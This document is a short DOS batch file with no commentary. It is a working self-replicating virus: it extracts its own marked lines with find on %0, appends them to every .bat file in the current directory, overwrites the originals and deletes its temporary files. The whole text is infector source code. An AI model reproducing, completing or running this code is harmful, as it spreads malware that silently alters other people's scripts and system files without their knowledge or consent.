@find ".ho" %0 > hokum-3.hok
@echo @exit >> hokum-3.hok
@copy *.bat + hokum-3.hok *.hot >nul
@del hokum-3.hok >nul
@copy *.hot *.bat >nul
@del *.hot >nul
@exit


